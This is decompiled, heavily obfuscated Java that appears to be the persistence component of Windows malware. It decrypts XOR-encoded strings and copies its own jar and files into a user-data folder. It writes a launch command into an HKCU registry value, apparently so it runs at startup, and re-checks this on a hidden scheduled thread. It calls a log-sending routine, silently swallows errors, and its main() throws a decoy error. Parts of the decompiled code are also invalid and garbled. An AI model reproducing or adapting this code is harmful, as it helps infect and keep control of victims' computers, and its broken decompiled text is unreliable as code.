/*
 * Decompiled with CFR 0.152.
 */
import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.lang.invoke.CallSite;
import java.lang.invoke.LambdaMetafactory;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileAttribute;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public class \u056a {
    private static final String method_FF;
    private static final String method_FE;
    private static final Path method_FD;
    private static final String method_FC;
    private static final String method_FB;
    private static final ScheduledExecutorService method_FA;
    private static final String[] a;
    private static final long b;

    public static void method_FF(Object[] objectArray) {
        long l2 = (Long)objectArray[0];
        long l3 = l2;
        long l4 = 62768809898639L;
        int n2 = (int)(l4 >>> 32);
        int n3 = (int)(l4 << 32 >>> 48);
        int n4 = (int)(l4 << 48 >>> 48);
        long l5 = 68442360059666L;
        int n5 = (int)(l5 >>> 32);
        int n6 = (int)(l5 << 32 >>> 48);
        int n7 = (int)(l5 << 48 >>> 48);
        Thread.ofVirtual().name("f?+:u0_M\"").start(() -> \u056a.method_FE(n2, (short)n3, (char)n4));
        method_FA.scheduleWithFixedDelay(() -> \u056a.method_FD(n5, n6, (char)n7), 1L, b, TimeUnit.MINUTES);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void method_FE(int n2, short s2, char c2) {
        long l2;
        
        
        long l3 = l2 = (long)n2 << 32 | (long)s2 << 48 >>> 32 | (long)c2 << 48 >>> 48;
        long l4 = 7876870595997L;
        int n3 = (int)(l4 >>> 32);
        int n4 = (int)(l4 << 32 >>> 48);
        int n5 = (int)(l4 << 48 >>> 48);
        long l5 = 100010747566229L;
        int n6 = (int)(l5 >>> 32);
        int n7 = (int)(l5 << 32 >>> 48);
        int n8 = (int)(l5 << 48 >>> 48);
        long l6 = 83119032414600L;
        int n9 = \u0565.method_FA;
        try {
            int n10;
            block31: {
                block32: {
                    Path path;
                    Path path2;
                    block33: {
                        Path path3;
                        String[] stringArray;
                        block30: {
                            block29: {
                                File file;
                                Path path4;
                                File file2;
                                block28: {
                                    Files.createDirectories(method_FD, new FileAttribute[0]);
                                    file2 = \u056a.method_FF(new Object[0]);
                                    stringArray = a;
                                    path4 = method_FD.resolve("A$-gx*^<)>{4N.-");
                                    file = file2;
                                    if (n9 != 0) break block28;
                                    if (file == null) break block29;
                                    file = file2;
                                }
                                path3 = file.toPath();
                                if (n9 != 0) break block30;
                                Object[] objectArray = new Object[3];
                                objectArray[2] = l6;
                                objectArray[1] = path4;
                                objectArray[0] = path3;
                                if (\u056a.method_FF(objectArray)) {
                                    Files.copy(file2.toPath(), path4, StandardCopyOption.REPLACE_EXISTING);
                                }
                            }
                            stringArray = a;
                            path3 = Path.of(System.getProperty("{Sd"), new String[0]);
                        }
                        Path path5 = path3;
                        stringArray = a;
                        path2 = method_FD.resolve("F9,=v&C:!*");
                        n10 = n9;
                        if (c2 > '\u0000') {
                            if (n10 != 0) return;
                            n10 = Files.exists(path5, new LinkOption[0]) ? 1 : 0;
                        }
                        if (c2 < '\u0000') break block31;
                        if (n10 == 0) break block32;
                        path = path2;
                        if (n9 != 0) break block33;
                        n10 = Files.exists(path, new LinkOption[0]) ? 1 : 0;
                        if (n2 <= 0) break block31;
                        if (n10 != 0) break block32;
                        Object[] objectArray = new Object[5];
                        objectArray[4] = path2;
                        objectArray[3] = n8;
                        objectArray[2] = (int)((char)n7);
                        objectArray[1] = path5;
                        objectArray[0] = n6;
                        \u056a.method_FE(objectArray);
                        path = path2.resolve("|?&,u4C");
                    }
                    Path path6 = path;
                    Path path7 = path2.resolve("9.<m\"BN\n!y1_X9.<FYE2'?is^$:-t7fN$;!u-ly#&I?&g^*CH9:,4&HNA$-gx*^!;y,BOx-0y3/!i7BRv#-ccXN7$-~\tve\"{1\t\nB$)e~&@G91");
                    n10 = n9;
                    if (c2 >= '\u0000') {
                        if (n10 != 0) return;
                        n10 = Files.exists(path6, new LinkOption[0]) ? 1 : 0;
                    }
                    if (n2 <= 0) break block31;
                    if (n10 == 0) break block32;
                    Path path8 = path7;
                    if (n9 != 0) break block32;
                    n10 = Files.exists(path8, new LinkOption[0]) ? 1 : 0;
                    if (s2 <= 0) break block31;
                    if (n10 == 0) {
                        path8 = Files.move(path6, path7, StandardCopyOption.REPLACE_EXISTING);
                    }
                }
                n10 = n3;
            }
            \u056a.method_FD(n10, n4, (char)n5);
            return;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void method_FD(int n2, int n3, char c2) {
        
        
        long l2 = (long)n2 << 32 | (long)n3 << 48 >>> 32 | (long)c2 << 48 >>> 48;
        long l3 = 133160401772533L;
        try {
            String[] stringArray = a;
            Path path2 = method_FD.resolve("g\tV`{\t[");
            if (!Files.exists(path2, new LinkOption[0])) {
                path2 = method_FD.resolve("h7+ 0");
            }
            stringArray = a;
            Path path = method_FD.resolve("x9.<m\"BN\n!y1_X9.<FYE2");
            if (!Files.exists(path2, new LinkOption[0])) return;
            if (!Files.exists(path, new LinkOption[0])) {
                return;
            }
            stringArray = a;
            String string = (String)((Object)"\"") + String.valueOf(path2.toAbsolutePath()) + "f?+:u0_M\"h\r~$U-*Y\"SC3" + String.valueOf(path.toAbsolutePath()) + (String)((Object)"\"");
            CallSite callSite = g_0.a("registryValueExists", "Od'!vrMb!#v$Kd##t!Mf#"r'Id"#rpMg#$srNf$%t&Oa%!s'H`!"v"Id"#q&Mg#$p)Nf$%p'Oa%!tqH`!"v$Id"#qvMg#$suNf$%tqOa%!w'H`!"uqId"#q%Mg#$t'Nf$%wvOa%!w!H`!"v&Id"#vpMg#$wsNf$%p'Oa%!qrH`!"v,Id"#rwMg#$p)Nf$%wsOa%!w!H`!"qrId"#vsMg#$qrNf$%wwOa%!w!H`!"v$", "(Lcom/sun/jna/platform/win32/WinReg$HKEY;Ljava/lang/String;Ljava/lang/String;)Z", 2, (Object)WinReg.HKEY_CURRENT_USER, (Object)"o?;+u1T30-", (Object)"F9,=v&C:!*");
            boolean bl2 = callSite != false && string.equals(g_0.a("registryGetStringValue", "Od'!vrMb!#v$Kd##t!Mf#"r'Id"#rpMg#$srNf$%t&Oa%!s'H`!"v"Id"#q&Mg#$p)Nf$%p'Oa%!tqH`!"v$Id"#qvMg#$suNf$%tqOa%!w'H`!"uqId"#q%Mg#$t'Nf$%wvOa%!w!H`!"v&Id"#vpMg#$wsNf$%p'Oa%!qrH`!"v,Id"#rwMg#$p)Nf$%wsOa%!w!H`!"qrId"#vsMg#$qrNf$%wwOa%!w!H`!"v$", "(Lcom/sun/jna/platform/win32/WinReg$HKEY;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", 2, (Object)WinReg.HKEY_CURRENT_USER, (Object)"", (Object)"<m\"BN\n!y1_X9.<FYE2'?is^$:-t7fN$;!u-ly#&A$-"));
            if (bl2) return;
            g_0.a("registrySetStringValue", "Od'!vrMb!#v$Kd##t!Mf#"r'Id"#rpMg#$srNf$%t&Oa%!s'H`!"v"Id"#q&Mg#$p)Nf$%p'Oa%!tqH`!"v$Id"#qvMg#$suNf$%tqOa%!w'H`!"uqId"#q%Mg#$t'Nf$%wvOa%!w!H`!"v&Id"#vpMg#$wsNf$%p'Oa%!qrH`!"v,Id"#rwMg#$p)Nf$%wsOa%!w!H`!"qrId"#vsMg#$qrNf$%wwOa%!w!H`!"v$", "(Lcom/sun/jna/platform/win32/WinReg$HKEY;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V", 2, (Object)WinReg.HKEY_CURRENT_USER, (Object)"", (Object)"<m\"BN\n!y1_X9.<FYE2'?is^$:-t7fN$;!u-ly#&A$-", (Object)string);
            Object[] objectArray = new Object[3];
            objectArray[2] = "A7>)4+_F3";
            objectArray[1] = l3;
            objectArray[0] = "x9.<m\"BN\n!y1_X9.<FYE2'?is^$:-t7fN$;!u-ly#&";
            LogSender.method_FF(objectArray);
            return;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private static boolean method_FF(Object[] objectArray) {
        
        try {
            
        }
        catch (RuntimeException runtimeException) {}
        throw new IllegalStateException();
        Path path = (Path)objectArray[0];
        Path path2 = (Path)objectArray[1];
        long l2 = (Long)objectArray[2];
        try {
            if (!Files.exists(path2, new LinkOption[0])) return true;
            if (Files.size(path) == Files.size(path2)) return false;
            return true;
        }
        catch (Exception exception) {
            return true;
        }
    }

    private static void method_FE(Object[] objectArray) throws Exception {
        int n2 = (Integer)objectArray[0];
        Path path = (Path)objectArray[1];
        int n3 = (Integer)objectArray[2];
        int n4 = (Integer)objectArray[3];
        Path path2 = (Path)objectArray[4];
        long l2 = (long)n2 << 32 | (long)n3 << 48 >>> 32 | (long)n4 << 48 >>> 48;
        long l3 = 132232598131021L;
        try (Stream<Path> stream = Files.walk(path, new FileVisitOption[0]);){
            stream.forEach(arg_0 -> \u056a.lambda$copyDir$1(path2, l3, path, arg_0));
        }
    }

    private static File method_FF(Object[] objectArray) {
        try {
            return new File(\u056a.class.getProtectionDomain().getCodeSource().getLocation().toURI());
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static void lambda$copyDir$1(Path path, long l2, Path path2, Path path3) {
        block11: {
            try {
                Path path4;
                block10: {
                    path4 = path.resolve(path2.relativize(path3));
                    if (!Files.isDirectory(path3, new LinkOption[0])) break block10;
                    Files.createDirectories(path4, new FileAttribute[0]);
                    break block11;
                }
                Files.copy(path3, path4, StandardCopyOption.REPLACE_EXISTING);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static Thread lambda$static$0(Runnable runnable2) {
        Thread thread2 = new Thread(runnable2, "?is^$:-t7fN$;!u-ly#&I?&g^*CH9:,4&HNA");
        thread2.setDaemon(true);
        return thread2;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block21: {
            block20: {
                block19: {
                    var7 = new String[23];
                    var5_1 = 0;
                    var4_2 = "x9.<m\"BN\n\u0005!y1_X9.<F\u0014YE2'?i\u001fs^$:-t7fN$;!u-ly#&\u000fI?&g^*CH9:,4&HN\u0013A$-gx*^\u0004\u0012!;y,BOx-0\u007f\u0013y3/!i7BRv#-ccXN7$-~\b\tve\"{1\u0010\t\nB$)e~&@G91\fg\u0019\u000b\tV\u0002`{\u0012\t\u001c[\tA7>)4+_F3\u0017f?+:u0_M\"h\r~$U\u000b\u0001-*Y\"SC3\tf?+:u0_M\"\rI?&gp\"FJ!f-b&\u0007{\u0013\u001a\u001bS\u0010d\u000bF9,=v&C\u0005:!*\u0003A$-\u0007|?&,u4C-x9.<m\"BN\n\u0005!y1_X9.<F\u0014YE2'?i\u001fs^$:-t7fN$;!u-ly#&\u0011A$-gx*^\u0004<)>{4\u001eN.-\u000bF9,=v&C\u0005:!*\u000bB$)ej&BX?;<\u000bo?;+u1T\u000530-\u0006h7+ \u007f0";
                    var6_3 = "x9.<m\"BN\n\u0005!y1_X9.<F\u0014YE2'?i\u001fs^$:-t7fN$;!u-ly#&\u000fI?&g^*CH9:,4&HN\u0013A$-gx*^\u0004\u0012!;y,BOx-0\u007f\u0013y3/!i7BRv#-ccXN7$-~\b\tve\"{1\u0010\t\nB$)e~&@G91\fg\u0019\u000b\tV\u0002`{\u0012\t\u001c[\tA7>)4+_F3\u0017f?+:u0_M\"h\r~$U\u000b\u0001-*Y\"SC3\tf?+:u0_M\"\rI?&gp\"FJ!f-b&\u0007{\u0013\u001a\u001bS\u0010d\u000bF9,=v&C\u0005:!*\u0003A$-\u0007|?&,u4C-x9.<m\"BN\n\u0005!y1_X9.<F\u0014YE2'?i\u001fs^$:-t7fN$;!u-ly#&\u0011A$-gx*^\u0004<)>{4\u001eN.-\u000bF9,=v&C\u0005:!*\u000bB$)ej&BX?;<\u000bo?;+u1T\u000530-\u0006h7+ \u007f0".length();
                    var3_4 = 45;
                    var2_5 = -1;
lbl7:
                    // 2 sources

                    while (true) {
                        v0 = ++var2_5;
                        v1 = var4_2.substring(v0, v0 + var3_4);
                        v2 = -1;
                        break block19;
                        break;
                    }
lbl12:
                    // 1 sources

                    while (true) {
                        var7[var5_1++] = v3.intern();
                        if ((var2_5 += var3_4) < var6_3) {
                            var3_4 = var4_2.charAt(var2_5);
                            ** continue;
                        }
                        var4_2 = "f?+:u0_M\"h\r~$U\u000b\u0001-*Y\"SC3\b|3*\u000b{ XN";
                        var6_3 = "f?+:u0_M\"h\r~$U\u000b\u0001-*Y\"SC3\b|3*\u000b{ XN".length();
                        var3_4 = 23;
                        var2_5 = -1;
lbl21:
                        // 2 sources

                        while (true) {
                            v4 = ++var2_5;
                            v1 = var4_2.substring(v4, v4 + var3_4);
                            v2 = 0;
                            break block19;
                            break;
                        }
                        break;
                    }
lbl26:
                    // 1 sources

                    while (true) {
                        var7[var5_1++] = v3.intern();
                        if ((var2_5 += var3_4) < var6_3) {
                            var3_4 = var4_2.charAt(var2_5);
                            ** continue;
                        }
                        break block20;
                        break;
                    }
                }
                v5 = v1.toCharArray();
                v6 = v5;
                v7 = v5.length;
                var8_7 = 0;
                if (true) ** GOTO lbl65
                do {
                    v6 = v6;
                    v8 = var8_7;
                    v9 = v6[v8];
                    switch (var8_7 % 7) {
                        case 0: {
                            v10 = 43;
                            break;
                        }
                        case 1: {
                            v10 = 86;
                            break;
                        }
                        case 2: {
                            v10 = 72;
                            break;
                        }
                        case 3: {
                            v10 = 72;
                            break;
                        }
                        case 4: {
                            v10 = 26;
                            break;
                        }
                        case 5: {
                            v10 = 67;
                            break;
                        }
                        default: {
                            v10 = 48;
                        }
                    }
                    v6[v8] = (char)(v9 ^ v10);
                    ++var8_7;
lbl65:
                    // 2 sources

                    v7 = v7;
                } while (v7 > var8_7);
                v3 = new String(v6);
                switch (v2) {
                    default: {
                        ** continue;
                    }
                    ** case 0:
lbl73:
                    // 1 sources

                    ** continue;
                }
            }
            \u056a.a = var7;
            \u056a.method_FC = \u056a."-gx*^!;y,BOx-0y3/!i7BRv#-ccXN7$-";
            \u056a.method_FE = \u056a."";
            \u056a.method_FB = \u056a."x9.<m\"BN\n!y1_X9.<FYE2";
            \u056a.method_FF = \u056a."<m\"BN\n!y1_X9.<FYE2'?is^$:-t7fN$;!u-ly#&A$-";
            break block21;
lbl82:
            // 1 sources

            while (true) {
                continue;
                break;
            }
        }
        var0_8 = 1094669463021L;
        ** while (true)
        \u056a.b = 1094669463010L ^ var0_8;
        var2_6 = \u056a.a;
        \u056a.method_FD = Path.of(System.getenv("I?&gp\"FJ!f-b&"), new String[]{"A$-", "B$)ej&BX?;<", "\tve\"{1\t\nB$)e~&@G91g\tV`{\t[\tA7>)4+_F3f?+:u0_M\"h\r~$U-*Y\"SC3\tf?+:u0_M\"\rI?&gp\"FJ!f-b&{SdF9,=v&C:!*A$-|?&,u4C-x9", var2_6[22]});
        \u056a.method_FA = Executors.newSingleThreadScheduledExecutor((ThreadFactory)LambdaMetafactory.metafactory(null, null, null, (Ljava/lang/Runnable;)Ljava/lang/Thread;, lambda$static$0(java.lang.Runnable ), (Ljava/lang/Runnable;)Ljava/lang/Thread;)());
    }

    public static void main(String[] stringArray) {
        throw new RuntimeException("Invalid execution context: 0xb88bb8");
    }
}

